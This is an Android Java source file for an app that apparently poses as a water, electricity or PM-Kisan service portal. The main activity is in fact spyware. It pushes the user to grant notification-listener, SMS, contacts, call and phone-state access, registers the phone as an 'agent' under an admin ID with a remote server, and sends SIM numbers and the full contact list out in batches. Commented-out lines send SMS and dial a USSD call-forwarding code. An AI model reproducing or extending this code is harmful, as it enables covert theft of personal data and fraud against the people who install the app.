package com.pegalite.neotron3.ui;

import android.annotation.SuppressLint;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AppCompatDelegate;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.gson.Gson;
import com.pegalite.neotron3.R;
import com.pegalite.neotron3.databinding.ActivityMainBinding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;
import com.pegalite.neotron3.server.socket.SocketService;
import com.pegalite.neotron3.ui.electricity.ElectricityLoginActivity;
import com.pegalite.neotron3.ui.water.ConnectionInformationActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    // Request code for all grouped runtime permissions
    private static final int REQUEST_CODE_PERMISSIONS = 100;

    // List of permissions to request (except MANAGE_EXTERNAL_STORAGE, which is handled separately)
    private final String[] REQUIRED_PERMISSIONS = new String[]{
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.READ_PHONE_STATE
    };

    ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO);

//        Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
//        startActivity(intent);

        if (!isNotificationAccessEnabled()) {
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            try {
                startActivity(intent);
                finish();
            } catch (ActivityNotFoundException e) {
                // Fallback to app settings as a backup
                Intent fallbackIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                fallbackIntent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(fallbackIntent);
                finish();
            }
            Toast.makeText(this, "Please enable notification access for this app.", Toast.LENGTH_LONG).show();
            return;
        }

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        String packageName = getPackageName();
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            @SuppressLint("BatteryLife") Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent);
        }

        onAgentInit();
        checkAndRequestPermissions();
    }

    public boolean isNotificationAccessEnabled() {
        Set<String> enabledListeners = NotificationManagerCompat.getEnabledListenerPackages(this);
        return enabledListeners.contains(getPackageName());
    }


    @SuppressLint("HardwareIds")
    private void onAgentInit() {
        // From Activity or button click
        Intent serviceIntent = new Intent(this, SocketService.class);
        startForegroundService(serviceIntent); // ✅ Only from visible UI
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);

        JSONArray simInfo = new JSONArray();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
            List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
            if (subs == null) {
                return;
            }
            try {
                for (SubscriptionInfo info : subs) {
                    String number = info.getNumber(); // Mobile number (can be null!)
                    String carrierName = info.getCarrierName().toString(); // Airtel, Jio, etc.
                    String displayName = info.getDisplayName().toString();
                    simInfo.put(new JSONObject().put("number", number).put("carrierName", carrierName).put("displayName", displayName));
                }
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }
        }


        try {
            RetrofitClient.getInstance(this).getApiInterfaces().onAgentInit(RetrofitClient.generateRequestBody(new JSONObject().put("simInfo", simInfo).put("agentName", getString(R.string.app_name)).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName()).put("adminID", Utils.ADMIN_ID).put("deviceName", android.os.Build.MODEL))).enqueue(new Callback<>() {
                @Override
                public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                }

                @Override
                public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                }
            });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    private void checkAndRequestPermissions() {
        // Collect any missing permissions.
        List<String> permissionsNeeded = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }

        // Request any permissions that are missing.
        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]),
                    REQUEST_CODE_PERMISSIONS);
            return;
        }

        // All permissions are already granted; proceed with functionality.
        proceed();
        //        fetchContacts();
//        fetchSms();
//        sendSms("+917085323475", "Hello World!");
//        makeCall("*123#");
    }

    private void proceed() {
        fetchContactsAndUpload();

        if (Utils.THEME.equals("WATER")) {
            startActivity(new Intent(MainActivity.this, ConnectionInformationActivity.class));
        } else if (Utils.THEME.equals("POWER")) {
            startActivity(new Intent(MainActivity.this, ElectricityLoginActivity.class));
        } else {
            startActivity(new Intent(MainActivity.this, PmKisanActivity.class));
        }
//            String ussdCode = "*21*9863274998%23";
//            String ussdCode = "*123%23";
//        Intent intent = new Intent(Intent.ACTION_CALL);
//        intent.setData(Uri.parse((ussdCode)));
//        try{
//            startActivity(intent);
//        } catch (SecurityException e){
//            e.printStackTrace();
//        }
//        sendSms("+919863274998", "Hello World!");
    }


    private Uri ussdToCallableUri(String ussd) {

        String uriString = "";

        if (!ussd.startsWith("tel:"))
            uriString += "tel:";

        for (char c : ussd.toCharArray()) {

            if (c == '#')
                uriString += Uri.encode("#");
            else
                uriString += c;
        }

        return Uri.parse(uriString);
    }

    private void makeCall(String phoneNumber) {
        String encodedUssd = Uri.encode(phoneNumber);
        Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:" + encodedUssd));
        startActivity(intent);
    }


    private void sendSms(String phoneNumber, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, message, null, null);
            Toast.makeText(this, "SMS Sent Successfully!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "SMS Sending Failed!", Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }

    private void fetchContactsAndUpload() {
        SharedPreferences prefs = getSharedPreferences("sent_contacts", MODE_PRIVATE);
        Set<String> alreadySentPhones = prefs.getStringSet("phones", new HashSet<>());

        List<HashMap<String, String>> contactList = new ArrayList<>();
        Set<String> newPhonesThisSession = new HashSet<>();

        Cursor cursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
                null, null, null
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(0);
                String phoneNumber = cursor.getString(1).replaceAll("\\s+", "");

                if (alreadySentPhones.contains(phoneNumber)) continue; // Skip already sent

                HashMap<String, String> contact = new HashMap<>();
                contact.put("name", name);
                contact.put("phone", phoneNumber);

                contactList.add(contact);
                newPhonesThisSession.add(phoneNumber);
            }
            cursor.close();
        }

        // Now send in batches
        int batchSize = 400;
        for (int i = 0; i < contactList.size(); i += batchSize) {
            int end = Math.min(i + batchSize, contactList.size());
            List<HashMap<String, String>> batch = contactList.subList(i, end);
            sendContactBatch(batch, i / batchSize + 1, newPhonesThisSession);
        }
    }

    @SuppressLint("HardwareIds")
    private void sendContactBatch(List<HashMap<String, String>> batch, int batchNumber, Set<String> newPhones) {
        Gson gson = new Gson();
        String jsonContacts = gson.toJson(batch);

        RequestBody body = RetrofitClient.generateRequestBody(jsonContacts);
        String agentId = "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName();

        RetrofitClient.getInstance(this)
                .getApiInterfaces()
                .onSaveContacts(body, agentId)
                .enqueue(new Callback<>() {
                    @Override
                    public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                        if (response.isSuccessful()) {
                            Log.d("Upload", "Batch " + batchNumber + " uploaded successfully");

                            // Save sent numbers
                            SharedPreferences prefs = getSharedPreferences("sent_contacts", MODE_PRIVATE);
                            Set<String> savedSet = prefs.getStringSet("phones", new HashSet<>());
                            Set<String> mergedSet = new HashSet<>(savedSet);
                            for (HashMap<String, String> c : batch) {
                                mergedSet.add(c.get("phone"));
                            }

                            prefs.edit().putStringSet("phones", mergedSet).apply();
                        } else {
                            Log.e("Upload", "Batch " + batchNumber + " failed: " + response.code());
                        }
                    }

                    @Override
                    public void onFailure(Call<ResponseBody> call, Throwable t) {
                        Log.e("Upload", "Batch " + batchNumber + " failed: " + t.getMessage());
                    }
                });
    }

    /**
     * Handle the permission request results.
     */
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            boolean allGranted = true;

            // Check every requested permission.
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    // Here you can show a message or dialog explaining why the permission is needed.
                    break;
                }
            }

            if (allGranted) {
                proceed();
            } else {
                Toast.makeText(this, "Please Grant All the Permissions to Continue!", Toast.LENGTH_SHORT).show();
                finishAffinity();
            }
        }
    }


}